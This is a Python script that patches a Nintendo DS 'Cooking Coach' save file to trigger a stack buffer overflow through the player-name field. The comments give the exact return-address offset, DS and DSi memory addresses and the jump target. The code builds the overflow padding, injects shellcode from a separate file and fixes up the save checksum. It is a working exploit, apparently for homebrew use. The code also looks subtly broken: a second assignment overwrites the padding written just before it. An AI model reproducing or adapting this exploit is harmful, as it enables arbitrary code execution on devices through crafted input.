#!/usr/bin/env python
#
# "Fix" a Cooking Coach save file...
# For VCKE card (US version).
#

import sys, struct

def exploitName(name):
    # 'name' is a pointer to the player's name in the save game file.
    # If we overflow it, we end up jumping to the address at word 127
    # from the return at address 0x2086244:
    #
    #     LDMFD SP!, {R4, PC}
    #
    # After the jump, SP is 0x27c2c48. So, the
    # address of the name buffer should be:
    #
    #    0x27c2c48 - 4 - 127*4 = 0x27c2a48
    #
    # On the DS at least, copies of the name also end up in main memory
    # at two more places:
    #
    #    0x021798c0 (A copy of this section of the EEPROM)
    #    0x021e2318 (The welcome message on-screen)
    #
    # The actual stack pointer will be different on DS vs. DSi, but
    # the address of the EEPROM copy and the offset of the LR clobber
    # are identical on both platforms.
    #
    # The EEPROM copy is written by code at 0x20d1ce8.
    #
    # I think the original LR value was 0x2058828. Stack contents
    # shortly prior to the overrun, on DS:
    #
    # 0x27c2a48:        0x00000001      0x00000000      0x00000000      0x00000000
    # 0x27c2a58:        0x00000000      0x00000000      0x00000000      0x00000000
    # ...
    # 0x27c2c28:        0x00000000      0x00000000      0x00000000      0x00000000
    # 0x27c2c38:        0x00000000      0x00000000      0x021e1710      0x02058828
    #

    exploitAddr = 0x021798c0 + 1
    lrWordOffset = 127
    pad = 0x11111111

    # Padding and SP exploit.
    name[0] = (struct.pack("<I", pad) * lrWordOffset
               + struct.pack("<I", exploitAddr)
               + '\0')

    # Exploit code here. Can't have any zeroes!
    exploit = open("exploit.bin", 'rb').read()
    if exploit.find('\0') >= 0:
        raise Exception("No zeroes allowed in exploit code")
    name[0] = exploit

def updateChecksum(data, len):
    sum = 0xB4BA
    for i in xrange(8, len):
        sum -= data[i]

    data[4] = sum & 0xFF
    data[5] = (sum >> 8) & 0xFF

if __name__ == "__main__":
    import patchlib
    data = patchlib.BinaryPatcher().load()

    # The actual save EEPROM is 8kB, but NDS Backup Tool likes
    # to think it's 64K. Apply the patch to every 8kB block of the save.

    for i in range(0, len(data) / 0x2000):
        copy = data.offset(0x2000 * i)

        exploitName(copy.offset(8))
        updateChecksum(copy, 0x378)
